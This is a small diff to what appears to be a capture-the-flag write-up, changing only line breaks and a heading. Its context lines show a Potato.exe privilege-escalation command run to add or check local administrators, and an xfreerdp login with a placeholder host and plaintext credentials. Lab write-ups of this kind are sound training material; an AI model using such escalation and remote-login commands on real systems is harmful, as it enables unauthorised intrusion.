@@ -318,6 +318,7 @@ C:\xampp\htdocs>
 
 <br>
 <br>
+<br>
 
 ```bash
 C:\xampp\htdocs>Potato.exe "net localgroup administrators"
@@ -352,8 +353,6 @@ C:\xampp\htdocs>
 
 <br>
 <br>
-
-<h3>xfreerdp</h3>
 
 ```bash
 :~/Stealth# xfreerdp /v:'xx.xxx.xxx.xxx' /u:'lili' /p:'pass123&
